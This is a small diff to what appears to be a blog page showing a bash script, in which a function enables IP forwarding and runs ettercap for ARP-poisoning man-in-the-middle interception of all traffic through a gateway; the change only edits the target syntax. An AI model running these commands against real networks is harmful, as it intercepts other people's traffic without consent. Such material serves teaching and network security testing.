@@ -129,7 +129,7 @@ sudo ettercap -T -M arp:remote /$gatewayIP// /$targetIP//;
 function poison_all ()
 {
 sudo sysctl -w net.ipv4.ip_forward=1;
-sudo ettercap -T -M arp:remote /$gatewayIP// ///;
+sudo ettercap -T -M arp:remote /$gatewayIP// //;
 }
 #Same as above, but an unspecified target means, "collect all traffic going to and from the first targeted device"
 {% endhighlight %}
